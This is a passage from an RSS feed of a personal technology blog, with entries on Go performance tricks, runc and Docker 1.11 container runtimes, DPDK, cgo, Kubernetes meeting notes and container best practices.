&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/sys&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;/proc/sysrq-trigger&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, it is very clear how it works:&lt;/p></description></item><item><title>Go performance optimize</title><link>https://feisky.xyz/posts/2016-05-06-go-performance-optimize/</link><pubDate>Fri, 06 May 2016 20:40:06 +0000</pubDate><guid>https://feisky.xyz/posts/2016-05-06-go-performance-optimize/</guid><description>&lt;p>**&lt;a href="http://mp.weixin.qq.com/s?src=3&amp;amp;timestamp=1461920086&amp;amp;ver=1&amp;amp;signature=dvsw--b6KnMYdRt43I2g4kMRIN37-tbcl2AnwpG58mxVaoZpqG24Aou2amIcFH1aIgXelirKZ0iSYJnPud*qh3uzFrbmeM*bcDNCVC0t*m4oEblW1GOp0FHTsG-lSzRzE67RaskRf7u4*B5NZlkmYhTbWJNF44Bvwz9D58*D-54=">Go性能优化技巧(By 雨痕)&lt;/a>&lt;/p>
&lt;ol>
&lt;li>字符串（string）作为一种不可变类型，在与字节数组（slice, [ ]byte）转换时需付出 “沉重” 代价，根本原因是对底层字节数组的复制。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-go" data-lang="go">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;unsafe&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> &lt;span style="color:#a6e22e">str2bytes&lt;/span>(&lt;span style="color:#a6e22e">s&lt;/span> &lt;span style="color:#66d9ef">string&lt;/span>) []&lt;span style="color:#66d9ef">byte&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">ptr&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>[&lt;span style="color:#ae81ff">2&lt;/span>]&lt;span style="color:#66d9ef">uintptr&lt;/span>)(&lt;span style="color:#a6e22e">unsafe&lt;/span>.&lt;span style="color:#a6e22e">Pointer&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">s&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">btr&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> [&lt;span style="color:#ae81ff">3&lt;/span>]&lt;span style="color:#66d9ef">uintptr&lt;/span>{&lt;span style="color:#a6e22e">ptr&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>], &lt;span style="color:#a6e22e">ptr&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#a6e22e">ptr&lt;/span>[&lt;span style="color:#ae81ff">1&lt;/span>]}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>[]&lt;span style="color:#66d9ef">byte&lt;/span>)(&lt;span style="color:#a6e22e">unsafe&lt;/span>.&lt;span style="color:#a6e22e">Pointer&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">btr&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> &lt;span style="color:#a6e22e">bytes2str&lt;/span>(&lt;span style="color:#a6e22e">b&lt;/span> []&lt;span style="color:#66d9ef">byte&lt;/span>) &lt;span style="color:#66d9ef">string&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#66d9ef">string&lt;/span>)(&lt;span style="color:#a6e22e">unsafe&lt;/span>.&lt;span style="color:#a6e22e">Pointer&lt;/span>(&lt;span style="color:#f92672">&amp;amp;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">func&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">s&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;abcdefghi&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">str2bytes&lt;/span>(&lt;span style="color:#a6e22e">s&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">s2&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#a6e22e">bytes2str&lt;/span>(&lt;span style="color:#a6e22e">b&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fmt&lt;/span>.&lt;span style="color:#a6e22e">Println&lt;/span>(&lt;span style="color:#a6e22e">s&lt;/span>, &lt;span style="color:#a6e22e">b&lt;/span>, &lt;span style="color:#a6e22e">s2&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>
&lt;p>Go Proverbs: A little copying is better than a little dependency. 对于一些短小的对象，复制成本远小于在堆上分配和回收操作。&lt;/p></description></item><item><title>The Rise of Cloud Computing Systems - Jeff Dean</title><link>https://feisky.xyz/posts/2016-05-05-the-rise-of-cloud-computing-systems-jeff-dean/</link><pubDate>Thu, 05 May 2016 17:16:46 +0000</pubDate><guid>https://feisky.xyz/posts/2016-05-05-the-rise-of-cloud-computing-systems-jeff-dean/</guid><description>&lt;p>{% pdf &lt;a href="http://feiskyer.github.io/assets/ccs.pdf">http://feiskyer.github.io/assets/ccs.pdf&lt;/a> %}&lt;/p></description></item><item><title>Reading notes of week 17</title><link>https://feisky.xyz/posts/2016-04-29-reading-notes-of-week-17/</link><pubDate>Fri, 29 Apr 2016 16:50:14 +0000</pubDate><guid>https://feisky.xyz/posts/2016-04-29-reading-notes-of-week-17/</guid><description>&lt;p>&lt;strong>&lt;a href="http://blog.kubernetes.io/2016/04/Kubernetes-Network-Policy-APIs.html">SIG-Networking: Kubernetes Network Policy APIs Coming in 1.3&lt;/a>&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>One problem many users have is that the open access network policy of Kubernetes is not suitable for applications that need more precise control over the traffic that accesses a pod or service. Today, this could be a multi-tier application where traffic is only allowed from a tier’s neighbor. But as new Cloud Native applications are built by composing microservices, the ability to control traffic as it flows among these services becomes even more critical.&lt;/p></description></item><item><title>runc and runV</title><link>https://feisky.xyz/posts/2016-04-28-runc/</link><pubDate>Thu, 28 Apr 2016 11:15:03 +0000</pubDate><guid>https://feisky.xyz/posts/2016-04-28-runc/</guid><description>&lt;p>runc is a CLI tool for spawning and running containers according to the OCI specification, while runV is a hypervisor-based runtime for OCI. Both of them are recommanded (implementations](&lt;a href="https://github.com/opencontainers/runtime-spec/blob/master/implementations.md">https://github.com/opencontainers/runtime-spec/blob/master/implementations.md&lt;/a>) of OCI.&lt;/p>
&lt;h2 id="playing-with-runc">Playing with runc&lt;/h2>
&lt;p>Install runc:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>yum install -y libseccomp-devel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir -p $GOPATH/src/github.com/opencontainers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cd $GOPATH/src/github.com/opencontainers
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>git clone https://github.com/opencontainers/runc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cd runc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>make
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo make install
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Run busybox:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>$ docker pull busybox
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ mkdir rootfs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ docker export &lt;span style="color:#66d9ef">$(&lt;/span>docker create busybox&lt;span style="color:#66d9ef">)&lt;/span> | tar -C rootfs -xvf -
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ runc spec .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ runc start test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/ &lt;span style="color:#75715e"># ps&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PID USER COMMAND
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">1&lt;/span> root sh
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">9&lt;/span> root ps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="playing-with-docker-containerd">Playing with docker-containerd&lt;/h2>
&lt;p>docker-containerd is installed togather with docker 1.11.&lt;/p></description></item><item><title>Container runtime in Docker v1.11</title><link>https://feisky.xyz/posts/2016-04-28-docker-1-11-runtime/</link><pubDate>Thu, 28 Apr 2016 10:07:23 +0000</pubDate><guid>https://feisky.xyz/posts/2016-04-28-docker-1-11-runtime/</guid><description>&lt;p>Docker v1.11正式集成了runc（终于支持OCI了），并将原来的一个二进制文件拆分为多个，同时还保持docker CLI和API不变：&lt;/p>
&lt;ul>
&lt;li>docker&lt;/li>
&lt;li>docker-containerd&lt;/li>
&lt;li>docker-containerd-shim&lt;/li>
&lt;li>docker-runc&lt;/li>
&lt;li>docker-containerd-ctr&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://feisky.xyz/images/docker-v11.png" alt="">&lt;/p></description></item><item><title>DPDK Introduction</title><link>https://feisky.xyz/posts/2016-04-24-dpdk-introduction/</link><pubDate>Sun, 24 Apr 2016 19:43:07 +0000</pubDate><guid>https://feisky.xyz/posts/2016-04-24-dpdk-introduction/</guid><description>&lt;h2 id="dpdk-introduction">DPDK Introduction&lt;/h2>
&lt;p>Intel DPDK全称Intel Data Plane Development Kit，是intel提供的数据平面开发工具集，为Intel architecture（IA）处理器架构下用户空间高效的数据包处理提供库函数和驱动的支持，它不同于Linux系统以通用性设计为目的，而是专注于网络应用中数据包的高性能处理。DPDK应用程序是运行在用户空间上利用自身提供的数据平面库来收发数据包，绕过了Linux内核协议栈对数据包处理过程。Linux内核将DPDK应用程序看作是一个普通的用户态进程，包括它的编译、连接和加载方式和普通程序没有什么两样。DPDK程序启动后只能有一个主线程，然后创建一些子线程并绑定到指定CPU核心上运行。&lt;/p></description></item><item><title>Tips for cgo</title><link>https://feisky.xyz/posts/2016-04-24-tips-for-cgo/</link><pubDate>Sun, 24 Apr 2016 08:29:02 +0000</pubDate><guid>https://feisky.xyz/posts/2016-04-24-tips-for-cgo/</guid><description>&lt;p>cgo的一些tips&lt;/p>
&lt;h2 id="基本类型">基本类型&lt;/h2>
&lt;p>The standard C numeric types are available under the names C.char, C.schar (signed char), C.uchar (unsigned char), C.short, C.ushort (unsigned short), C.int, C.uint (unsigned int), C.long, C.ulong (unsigned long), C.longlong (long long), C.ulonglong (unsigned long long), C.float, C.double, C.complexfloat (complex float), and C.complexdouble (complex double). The C type void* is represented by Go&amp;rsquo;s unsafe.Pointer. The C types &lt;code>__int128_t&lt;/code> and &lt;code>__uint128_t&lt;/code> are represented by [16]byte.&lt;/p></description></item><item><title>cgo in go 1.6</title><link>https://feisky.xyz/posts/2016-04-19-cgo-in-go-1-6/</link><pubDate>Tue, 19 Apr 2016 22:04:48 +0000</pubDate><guid>https://feisky.xyz/posts/2016-04-19-cgo-in-go-1-6/</guid><description>&lt;blockquote>
&lt;p>The major change is the definition of rules for sharing Go pointers with C code, to ensure that such C code can coexist with Go&amp;rsquo;s garbage collector. Briefly, Go and C may share memory allocated by Go when a pointer to that memory is passed to C as part of a cgo call, provided that the memory itself contains no pointers to Go-allocated memory, and provided that C does not retain the pointer after the call returns. These rules are checked by the runtime during program execution: if the runtime detects a violation, it prints a diagnosis and crashes the program. The checks can be disabled by setting the environment variable GODEBUG=cgocheck=0, but note that the vast majority of code identified by the checks is subtly incompatible with garbage collection in one way or another. Disabling the checks will typically only lead to more mysterious failure modes. Fixing the code in question should be strongly preferred over turning off the checks.&lt;/p></description></item><item><title>Borg, Omega, and Kubernetes (ACM Queue)</title><link>https://feisky.xyz/posts/2016-03-04-borg-omega-and-kubernetes-acm-queue/</link><pubDate>Fri, 04 Mar 2016 15:46:28 +0000</pubDate><guid>https://feisky.xyz/posts/2016-03-04-borg-omega-and-kubernetes-acm-queue/</guid><description>&lt;p>Brendan Burns, Brian Grant等在&lt;a href="http://queue.acm.org/detail.cfm?id=2898444">Borg, Omega, and Kubernetes - Lessons learned from three container-management systems over a decade&lt;/a>分享了Google在容器管理的经验教训。&lt;/p>
&lt;p>在谷歌的历史上，开发了三种容器管理调度系统：&lt;/p></description></item><item><title>Docker overlay network dive</title><link>https://feisky.xyz/posts/2016-03-04-docker-overlay-network-dive/</link><pubDate>Fri, 04 Mar 2016 13:41:54 +0000</pubDate><guid>https://feisky.xyz/posts/2016-03-04-docker-overlay-network-dive/</guid><description>&lt;p>DON MILLS写的&lt;a href="http://www.singlestoneconsulting.com/blog/2016/january/docker-networking?mkt_tok=3RkMMJWWfF9wsRonuqTMZKXonjHpfsX57usvUK%2B2lMI%2F0ER3fOvrPUfGjI4DS8FjI%2BSLDwEYGJlv6SgFQ7LMMaZq1rgMXBk%3D">Docker Multi-Host Networking: Overlays to the Rescue&lt;/a>对Docker的overlay network做了细致的分析，&lt;a href="https://feisky.xyz/assets/DockerNetworking2.pdf">值得看一看&lt;/a>。&lt;/p></description></item><item><title>Kubernetes sig-node (Asia) meeting notes</title><link>https://feisky.xyz/posts/2016-03-02-kubernetes-sig-node-asia-meeting-nodes/</link><pubDate>Wed, 02 Mar 2016 17:07:00 +0000</pubDate><guid>https://feisky.xyz/posts/2016-03-02-kubernetes-sig-node-asia-meeting-nodes/</guid><description>&lt;h2 id="kubernetes-12-status-update-dchen">Kubernetes 1.2 Status Update (@dchen)&lt;/h2>
&lt;ul>
&lt;li>Deployment object and HPA scale还有一些P0和P1的问题待解决&lt;/li>
&lt;li>aws还有挺多的问题（应该要超过20个）&lt;/li>
&lt;li>整个v1.2还有超过100个issue，但大部分都不是block issue&lt;/li>
&lt;li>v1.2推荐使用Docker v1.9.1，Docker v1.10 validation &lt;a href="https://github.com/kubernetes/kubernetes/issues/19720">https://github.com/kubernetes/kubernetes/issues/19720&lt;/a>&lt;/li>
&lt;li>Docker v1.10最大的问题是镜像格式变化，需要某种转换镜像的管理机制&lt;/li>
&lt;/ul>
&lt;h2 id="huawei-conformance-test-liangchenye">Huawei Conformance Test (@liangchenye)&lt;/h2>
&lt;p>关于Pod运行和删除的PR已经merge，但是image的test还在开发中。主要的问题是没有文档指导rkt环境的搭建。&lt;/p></description></item><item><title>10 things to avoid in docker containers</title><link>https://feisky.xyz/posts/2016-03-01-10-things-to-avoid-in-docker-containers/</link><pubDate>Tue, 01 Mar 2016 16:33:16 +0000</pubDate><guid>https://feisky.xyz/posts/2016-03-01-10-things-to-avoid-in-docker-containers/</guid><description>&lt;p>Redhat发布的&lt;a href="https://developerblog.redhat.com/2016/02/24/10-things-to-avoid-in-docker-containers/">10 things to avoid in docker containers&lt;/a>对于构建基于Container的服务非常有意义。摘录如下：&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>Don’t store data in containers – A container can be stopped, destroyed, or replaced. An application version 1.0 running in container should be easily replaced by the version 1.1 without any impact or loss of data. For that reason, if you need to store data, store it in a volume, but take care if two containers write data on the same volume because it could cause corruption. Make sure your applications are designed to write to shared data stores.&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;p>需要持久化的数据存在volume中，这个是共识了。&lt;/p></description></item><item><title>Carina by Rackspace</title><link>https://feisky.xyz/posts/2016-02-29-carina-by-rackspace/</link><pubDate>Mon, 29 Feb 2016 19:20:27 +0000</pubDate><guid>https://feisky.xyz/posts/2016-02-29-carina-by-rackspace/</guid><description>&lt;h2 id="what-is-carina">What is Carina?&lt;/h2>
&lt;p>Carina is a container runtime environment (currently in Beta) that offers performance, container-native tools, and portability without sacrificing ease of use. You can get started in minutes by using open-source software on managed infrastructure to run your containerized applications.&lt;/p>
&lt;p>Your containers run in a bare-metal environment, which avoids the &amp;ldquo;hypervisor tax&amp;rdquo; on performance. Applications in this environment launch as much as 20 percent faster and run as much as 60 percent faster. This environment builds on the standard restrictions set out by libcontainer by using an AppArmor profile as an additional security layer to keep your resources isolated.&lt;/p></description></item><item><title>Notes about serverless</title><link>https://feisky.xyz/posts/notes-about-serverless/</link><pubDate>Fri, 26 Feb 2016 21:26:00 +0000</pubDate><guid>https://feisky.xyz/posts/notes-about-serverless/</guid><description>&lt;p>“只需要关注数据和业务逻辑，无需维护服务器，也不需要关心系统的容量和扩容”， serverless将大家从server中解放了出来，只需要关注业务逻辑本身。serverless的概念跟PaaS很像，又比传统的PaaS有着更好的易用性。&lt;/p></description></item><item><title>Hypernetes简介 - feisky</title><link>https://feisky.xyz/posts/2015-11-18-hypernetes%E7%AE%80%E4%BB%8B-feisky/</link><pubDate>Wed, 18 Nov 2015 17:12:00 +0000</pubDate><guid>https://feisky.xyz/posts/2015-11-18-hypernetes%E7%AE%80%E4%BB%8B-feisky/</guid><description>&lt;p>【摘要】好久没有更新博客了，今天给大家介绍下最近在Hypernetes上做的工作，这个也是之前在微信群里的一个分享。Hypernetes是一个真正多租户的Kubernetes Distro。Hypernetes在Kubernetes基础上增加了多租户认证授权、容器SDN网络、基于Hyper的容器执行引擎以及&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4975173.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>kubernetes多节点部署解析 - feisky</title><link>https://feisky.xyz/posts/2014-11-19-kubernetes%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2%E8%A7%A3%E6%9E%90-feisky/</link><pubDate>Wed, 19 Nov 2014 21:12:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-19-kubernetes%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2%E8%A7%A3%E6%9E%90-feisky/</guid><description>&lt;p>【摘要】注：以下操作均基于centos7系统。安装ansibleansilbe可以通过yum或者pip安装，由于kubernetes-ansible用到了密码，故而还需要安装sshpass：pip install ansiblewget &lt;a href="http://sourceforge.net/projects/ssh">http://sourceforge.net/projects/ssh&lt;/a>&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4108477.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>docker存储结构解析 - feisky</title><link>https://feisky.xyz/posts/2014-11-19-docker%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90-feisky/</link><pubDate>Wed, 19 Nov 2014 21:11:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-19-docker%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90-feisky/</guid><description>&lt;p>【摘要】由于aufs并未并入内核，故而目前只有Ubuntu系统上能够使用aufs作为docker的存储引擎，而其他系统上使用lvm thin provisioning（overlayfs是一个和aufs类似的union filesystem，未来有可能进入内核，但目前还没有；Lvm snapshot are&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4106212.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>docker底层技术概览 - feisky</title><link>https://feisky.xyz/posts/2014-11-19-docker%E5%BA%95%E5%B1%82%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88-feisky/</link><pubDate>Wed, 19 Nov 2014 21:11:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-19-docker%E5%BA%95%E5%B1%82%E6%8A%80%E6%9C%AF%E6%A6%82%E8%A7%88-feisky/</guid><description>&lt;p>【摘要】docker解决了云计算环境难于分发并且管理复杂，而用KVM、Xen等虚拟化又浪费系统资源的问题。Docker最初是基于lxc构建了容器引擎，为了提供跨平台支持，后又专门开发了libcontainer来抽象容器引擎。但无论是libcontainer还是lxc，其底层所依赖的内核特性都是相同的。我们来&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4105739.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>OpenStack部署工具总结 - feisky</title><link>https://feisky.xyz/posts/2014-11-18-openstack%E9%83%A8%E7%BD%B2%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93-feisky/</link><pubDate>Tue, 18 Nov 2014 21:48:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-18-openstack%E9%83%A8%E7%BD%B2%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93-feisky/</guid><description>&lt;p>【摘要】目前感觉比较简单直观的部署工具有RDO、devstack、Fuel等：1. RDOhttps://openstack.redhat.com/QuickstartREDHAT出品，支持Redhat、CentOS等系统。RDO基于puppet部署各个组件，支持单节点或多节点部署，在Redhat系操作系统&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4105084.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>使用 Device Mapper来改变Docker容器的大小 - feisky</title><link>https://feisky.xyz/posts/2014-11-18-%E4%BD%BF%E7%94%A8-device-mapper%E6%9D%A5%E6%94%B9%E5%8F%98docker%E5%AE%B9%E5%99%A8%E7%9A%84%E5%A4%A7%E5%B0%8F-feisky/</link><pubDate>Tue, 18 Nov 2014 21:47:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-18-%E4%BD%BF%E7%94%A8-device-mapper%E6%9D%A5%E6%94%B9%E5%8F%98docker%E5%AE%B9%E5%99%A8%E7%9A%84%E5%A4%A7%E5%B0%8F-feisky/</guid><description>&lt;p>【摘要】作者：Jérôme Petazzoni（ Docker 布道师）译者：Mark Shao（ EMC 中国高级工程师）如果在 CentOS 、 REHL 、 Fedor 或者其他默认没有 AUFS 支持的 Linux 发行版上使用 Docker ，你可能需要用到 Device Mapper 的存储插件&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4106004.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>从veth看虚拟网络设备的qdisc - feisky</title><link>https://feisky.xyz/posts/2014-11-18-%E4%BB%8Eveth%E7%9C%8B%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E7%9A%84qdisc-feisky/</link><pubDate>Tue, 18 Nov 2014 21:26:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-18-%E4%BB%8Eveth%E7%9C%8B%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E7%9A%84qdisc-feisky/</guid><description>&lt;p>【摘要】背景前段时间在测试docker的网络性能的时候，发现了一个veth的性能问题，后来给docker官方提交了一个PR，参考set tx_queuelen to 0 when create veth device，引起了一些讨论。再后来，RedHat的网络专家Jesper Brouer出来详细的讨论了一&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4105884.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>docker网络配置方法总结 - feisky</title><link>https://feisky.xyz/posts/2014-11-18-docker%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93-feisky/</link><pubDate>Tue, 18 Nov 2014 18:17:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-18-docker%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93-feisky/</guid><description>&lt;p>【摘要】docker启动时，会在宿主主机上创建一个名为docker0的虚拟网络接口，默认选择172.17.42.1/16，一个16位的子网掩码给容器提供了65534个IP地址。docker0只是一个在绑定到这上面的其他网卡间自动转发数据包的虚拟以太网桥，它可以使容器和主机相互通信,容器与容器间通信。问题是，&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4105497.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>Kubernetes系统架构简介 - feisky</title><link>https://feisky.xyz/posts/2014-11-18-kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</link><pubDate>Tue, 18 Nov 2014 18:17:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-18-kubernetes%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B-feisky/</guid><description>&lt;p>【摘要】1. 前言Together we will ensure that Kubernetes is a strong and open container management framework for any application and in any environment, whether i&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4106456.html">阅读全文&lt;/a>&lt;/p></description></item><item><title>集群工具ansible使用方法 - feisky</title><link>https://feisky.xyz/posts/2014-11-16-%E9%9B%86%E7%BE%A4%E5%B7%A5%E5%85%B7ansible%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-feisky/</link><pubDate>Sun, 16 Nov 2014 22:44:00 +0000</pubDate><guid>https://feisky.xyz/posts/2014-11-16-%E9%9B%86%E7%BE%A4%E5%B7%A5%E5%85%B7ansible%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-feisky/</guid><description>&lt;p>【摘要】ansible简介ansible是与puppet、saltstack类似的集群管理工具，其优点是仅需要ssh和Python即可使用，而不像puppet、saltstack那样都需要客户端。与puppet类似，ansible也支持丰富的功能：批量执行支持模块化，支持playbook（相比puppet还&amp;hellip; &lt;a href="http://www.cnblogs.com/feisky/p/4102613.html">阅读全文&lt;/a>&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/2017-02-13-software-engineering-at-google/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-02-13-software-engineering-at-google/</guid><description>&lt;h2 id="tags-google">layout: post
title: Software Engineering at Google
date: 2017-02-13 19:36:09
tags: [Google]&lt;/h2>
&lt;p>Google的Fergus Henderson在&lt;a href="https://arxiv.org/pdf/1702.01715.pdf">Software Engineering at Google&lt;/a>中介绍了Google的软件工程实践。&lt;/p>
&lt;h2 id="软件开发">软件开发&lt;/h2>
&lt;p>源码仓库&lt;/p>
&lt;ul>
&lt;li>单一源代码仓库，除了核心配置和安全相关代码，任何工程师都可以访问任何代码，并可以根据需要修改&lt;/li>
&lt;li>所有开发都基于master分支，发布的时候才创建发布分枝&lt;/li>
&lt;li>代码的每个子树都有owner，任何修改都需要owner批准&lt;/li>
&lt;/ul>
&lt;p>Blaze分布式构建系统&lt;/p></description></item><item><title/><link>https://feisky.xyz/posts/2017-03-03-aws-s3%E6%95%85%E9%9A%9C%E5%9B%9E%E9%A1%BE%E5%92%8C%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://feisky.xyz/posts/2017-03-03-aws-s3%E6%95%85%E9%9A%9C%E5%9B%9E%E9%A1%BE%E5%92%8C%E6%80%BB%E7%BB%93/</guid><description>&lt;h2 id="tags-aws">layout: post
title: AWS S3故障回顾和总结
date: 2017-03-03 22:27:50
tags: [aws]&lt;/h2>
&lt;h2 id="s3故障回顾">S3故障回顾&lt;/h2>
